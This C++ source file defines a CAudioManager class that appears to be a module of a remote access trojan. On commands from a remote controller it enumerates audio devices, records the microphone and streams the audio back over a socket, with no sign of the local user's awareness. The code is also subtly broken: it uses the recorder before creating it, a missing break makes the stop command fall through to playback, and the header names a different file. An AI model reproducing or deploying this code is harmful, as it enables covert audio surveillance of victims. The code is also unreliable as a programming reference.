// ShellManager.cpp: implementation of the CAudioManager class.
//
//////////////////////////////////////////////////////////////////////
#include "stdafx.h"
#include "AudioManager.h"


//#define WOSA_POOR	8000
//#define WOSA_LOW	11025
//#define WOSA_NORMAL	22050
//#define WOSA_HIGH	44100
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CAudioManager::CAudioManager(ISocketBase* pClient) :CManager(pClient)
{
	m_buser = FALSE;
	Initialize();  //发送设备列表

	m_pWaveRecord = new CWaveRecord(&m_ACode); //初始化获取
	m_pWaveRecord->SetCommClient(pClient); //设置发送

	m_pWavePlayback = new CWavePlayback(&m_ACode);    //初始化播放
	m_pWavePlayback->StartPlay();					//启动播放线程

	m_buser = TRUE;
}

CAudioManager::~CAudioManager()
{
	if (!m_buser) return;
	m_pWaveRecord->StopRec();
	delete	m_pWaveRecord;

	m_pWavePlayback->StopPlay();
	delete	m_pWavePlayback;
}

void CAudioManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (lpBuffer[0] == TOKEN_HEARTBEAT) return;
	switch (lpBuffer[0])
	{
	case COMMAND_SEND_START:		
		if (m_pWaveRecord->StartRec())
		{
			BYTE bToken = TOKEN_START_OK;
			Send( &bToken, sizeof(BYTE));
		}
		else
		{
			BYTE bToken = TOKEN_STOP_ERROR;
				Send(&bToken, sizeof(BYTE));
		}

		break;
	case COMMAND_SEND_STOP: 
	{
		if (m_pWaveRecord->StopRec())
		{
			BYTE bToken = TOKEN_STOP_OK;
			Send(&bToken, sizeof(BYTE));
		}
		else
		{
			BYTE bToken = TOKEN_STOP_ERROR;
			Send(&bToken, sizeof(BYTE));
		}
	}
	case COMMAND_SEND_DATE:
	{
		m_pWavePlayback->Playback((char*)lpBuffer + 1, nSize - 1);
	}
	break;
	case COMMAND_SET_IN:
	{
		int m_vol = 1;
		memcpy(&m_vol, (char*)lpBuffer + 1, 4);
		m_pWaveRecord->SetVolume((float)m_vol);
	}
	break;
	case COMMAND_SET_OUT:
	{
		int m_vol = 1;
		memcpy(&m_vol, (char*)lpBuffer + 1, 4);
		m_pWavePlayback->SetVolume((float)m_vol);
	}
	break;

	default:
		break;
	}



}


bool CAudioManager::Initialize()
{
	UINT nDevNum = waveInGetNumDevs();
	if (nDevNum == 0)
		return false;

	WAVE_INFO Wave_Info;
	ZeroMemory(&Wave_Info, sizeof(WAVE_INFO));

	for (UINT i = 0; i < nDevNum; i++)
	{
		WAVEINCAPS tagCaps;
		waveInGetDevCaps(i, &tagCaps, sizeof(tagCaps));
		_tcscat_s(Wave_Info.str, 1024, tagCaps.szPname);
		_tcscat_s(Wave_Info.str, 1024, _T("$"));

		if (i == 0)
		{
			// 根据 输入设备名  枚举输入线路  参数 设备名 字符串
			int nRet = m_pWaveRecord->EnumerateInputLines(tagCaps.szPname, Wave_Info.str);
			if (nRet == -1)
			{
				Wave_Info.nIndex = 0;
				_tcscat_s(Wave_Info.str, 1024, _T("N/A@"));
			}
			else
				Wave_Info.nIndex = nRet;

			_tcscat_s(Wave_Info.str, 1024, _T("|"));
		}
	}

	DWORD	dwBytesLength = 1 + sizeof(WAVE_INFO);
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (lpBuffer == NULL)
		return FALSE;

	lpBuffer[0] = TOKEN_AUDIO_START;
	memcpy(lpBuffer + 1, &Wave_Info, sizeof(WAVE_INFO));
	Send(lpBuffer, dwBytesLength);

	delete[] lpBuffer;

	return true;
}



